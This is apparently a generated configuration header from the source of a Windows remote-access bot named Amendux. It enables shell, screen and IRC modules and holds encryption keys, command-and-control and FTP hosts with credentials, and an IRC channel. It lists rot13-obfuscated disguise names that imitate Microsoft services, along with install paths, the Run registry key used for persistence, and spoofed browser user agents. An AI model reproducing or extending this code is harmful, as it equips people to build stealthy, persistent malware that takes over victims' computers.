#pragma once

//
//   GENERATED AT Sat Sep 17 14:43:49 UTC 2016
//
//   THIS FILE IS AUTO-GENERATED
//
//   >> DO NOT CHANGE THE CONTENTS OF THIS FILE, USE THE BUILDER INSTEAD <<
//

// INSDEF
#define EXE_NANME ""
#define INSTANCEID ""

// MODDEF
#define MODSHELL_ENABLED	1
#define MODSCREEN_ENABLED	1
#define MODCRYPT_ENABLED	0
#define MODIRC_ENABLED		1

// ENCDEF
#define VIGE_KEY		"JiD2OSA9Z0cmNxQ2zcPS"
#define XTEA_KEY		"JUlO.Phw5A+-aCfv"

// CCDEF
#define CHECKIN_PACE	15
#define SOLICIT_PACE	100

#define VARIANT_INVALID	1000//move

// AVCDEF
#if DEBUG
#define AVC_SCHEME		"uggc" // http
#define AVC_HOST		"0k17^arg23^arg" // 0x17.net23.net
#define AVC_URI			"nip*raqcbvag^cuc" // avc_endpoint.php
#else
#define AVC_SCHEME		"uggc" // http
#define AVC_HOST		"0k17^ay" // 0x.17.nl
#define AVC_URI			"nip*raqcbvag^cuc" // avc_endpoint.php
#endif

// FTPDEF
#if DEBUG
#define FTP_HOST		"0k17^arg23^arg" // 0x17.net23.net
#define FTP_DIR			"?ine" // /var
#define FTP_USER		"n6289090" // a6289090
#define FTP_PASS		"dnoDeidHrGi1fr4TzpkT" // qabQrvqUeTv1se4GmcxG
#else
#define FTP_HOST		"0k17^arg23^arg" // 0x17.net23.net
#define FTP_DIR			"?ine" // /var
#define FTP_USER		"n6289090" // a6289090
#define FTP_PASS		"dnoDeidHrGi1fr4TzpkT" // qabQrvqUeTv1se4GmcxG
#endif

// IRCDEF
#if DEBUG
#define IRC_HOST		"vep^serrabqr^arg" // irc.freenode.net
#define IRC_CHANNEL		"#dhramn" // quenza
#else
#define IRC_HOST		"vep^serrabqr^arg" // irc.freenode.net
#define IRC_CHANNEL		"#dhramn" // quenza
#endif

// BUILDDEF
#define ISBUILD 1

// BOOTDEF
// #define SECURE_DOUBLE_BOOT	1

#define variantCount() (sizeof(variantDisplayName) / sizeof(variantDisplayName[0]))
#define staticVariant() -1

namespace Amendux {

#if DEBUG
	enum class VariantList {
		SHHLP = 0,
		IPICU,
		COMSRV,
		WAHP,
		NTKHB,
		MSMPE,
	};
#endif

	static const char avcScheme[] = AVC_SCHEME;
	static const char avcHost[] = AVC_HOST;
	static const char avcUri[] = AVC_URI;

	static const char *variantExeName[] = {
		"fuUyc",	// Microsoft Shell Helper (SHHLP)
		"vcVPH",	// Microsoft Input ICU (IPICU)
		"PbzFei",	// Windows COM Service (COMSRV)
		"JnUc",		// Windows Active Host Process (WAHP)
		"AGXuO",	// Mircosoft NT Kernel Hub (NTKHB)
		"ZfZcR",	// Microsoft Anitmalware Service (MSMPE)
	};

	static const char *variantDisplayName[] = {
		"Zvpebfbsg&Furyy&Urycre",			// Microsoft Shell Helper
		"Zvpebfbsg&Vachg&VPH",				// Microsoft Input ICU
		"Jvaqbjf&PBZ&Freivpr",				// Windows COM Service
		"Jvaqbjf&Npgvir&Ubfg&Cebprff",		// Windows Active Host Process
		"Zvepbfbsg&AG&Xreary&Uho",			// Mircosoft NT Kernel Hub
		"Zvpebfbsg&Navgznyjner&Freivpr",	// Microsoft Anitmalware Service
	};

	static const char *variantPath[] = {
		"{Zvpebfbsg{Jvaqbjf{{Furyy",		// Microsoft\Windows\Shell
		"{Zvpebfbsg{VPH",					// Microsoft\ICU
		"{Cnpxntrf{jvaqbjf_pbz_fei",		// Packages\windows_com_srv
		"{Zvpebfbsg{Ubfg&Genpxre",			// Microsoft\Host Tracker
		"{Zvpebfbsg{PegUho",				// Microsoft\CrtHub
		"{Zvpebfbsg{ZFOhvyq{ZfZc",			// Microsoft\MSBuild\MsMp
	};

	static const char *variantRegister[] = {
		"fbsgjner{zvpebfbsg{jvaqbjf{furyy",									// software\microsoft\windows\shell
		"fbsgjner{zvpebfbsg{fcryyvat{bcgvbaf",								// software\microsoft\spelling\options
		"fbsgjner{zvpebfbsg{jvaqbjf&ag{pheeragirefvba{vpz",					// software\microsoft\windows nt\currentversion\icm
		"fbsgjner{zvpebfbsg{vzr",											// software\microsoft\ime
		"fbsgjner{zvpebfbsg{jvaqbjf{pheeragirefvba{nccubfg",				// software\microsoft\windows\currentversion\apphost
		"fbsgjner{zvpebfbsg{jvaqbjf{pheeragirefvba{nhguragvpngvba",			// software\microsoft\windows\currentversion\authentication
	};

	static const char *variantUserAgent[] = {
		"Zbmvyyn?5^0&}Jvaqbjf&AG&6^1;&JBJ64;&ei:13^0[&Trpxb?20100101&Sversbk?13^0^1",										// Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1
		"Zbmvyyn?5^0&}Jvaqbjf&AG&6^2;&JBJ64[&NccyrJroXvg?537^36&}XUGZY,&yvxr&Trpxb[&Puebzr?39^0^2171^95&Fnsnev?537^36",		// Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36
		"Zbmvyyn?5^0&}Znpvagbfu;&Vagry&Znp&BF&K&10^10;&ei:34^0[&Trpxb?20100101&Sversbk?34^0",								// Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:34.0) Gecko/20100101 Firefox/34.0
		"Zbmvyyn?4^0&}pbzcngvoyr;&ZFVR&6^0;&Jvaqbjf&AG&5^1;&SFY&7^0^6^01001[",												// Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)
		"Zbmvyyn?5^0&}Jvaqbjf&AG&6^1;&JBJ64;&ei:12^0[&Trpxb?20100101&Sversbk?12^0",											// Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0
		"Zbmvyyn?5^0&}K11;&H;&Yvahk&k86_64;&qr;&ei:1^9^2^8[&Trpxb?20100723&Hohagh?10^04&}yhpvq[&Sversbk?3^6^8",				// Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8
	};

	//static_assert(static_cast<size_t>(VariantList::_COUNTER) == variantCount(), "Variant size differs among structures");

	namespace Variant {

		static unsigned int pickVariant() {
			if (staticVariant() > 0 && variantCount() < staticVariant()) {
				return staticVariant();
			}

			return rand() % variantCount();
		}

		static char *getAvcScheme() {
			char *var = _strdup(avcScheme);

			Util::rot13<char>(var);

			return var;
		}

		static char *getAvcHost() {
			char *var = _strdup(avcHost);

			Util::rot13<char>(var);

			return var;
		}

		static char *getAvcUri() {
			char *var = _strdup(avcUri);

			Util::rot13<char>(var);

			return var;
		}

		static char *getExeName(unsigned int variant) {
			const char *encVar = variantExeName[variant];
			char *var = _strdup(encVar);

			Util::rot13<char>(var);

			return var;
		}

		static char *getDisplayName(unsigned int variant) {
			const char *encVar = variantDisplayName[variant];
			char *var = _strdup(encVar);

			Util::rot13<char>(var);

			return var;
		}

		static char *getPath(unsigned int variant) {
			const char *encVar = variantPath[variant];
			char *var = _strdup(encVar);

			Util::rot13<char>(var);

			return var;
		}

		static char *getRegister(unsigned int variant) {
			const char *encVar = variantRegister[variant];
			char *var = _strdup(encVar);

			Util::rot13<char>(var);

			return var;
		}

		static char *getUserAgent(unsigned int variant) {
			const char *encVar = variantUserAgent[variant];
			char *var = _strdup(encVar);

			Util::rot13<char>(var);

			return var;
		}

		static char *getExeExtension(unsigned int variant) {
			char *exe = _strdup("^rkr");

			Util::rot13<char>(exe);

			return exe;
		}

		static char *getRegisterRun(unsigned int variant) {
			char *run = _strdup("fbsgjner{zvpebfbsg{jvaqbjf{pheeragirefvba{eha");

			Util::rot13<char>(run);

			return run;
		}

	}

}

//
//   END OF AUTO-GENERATED FILE
//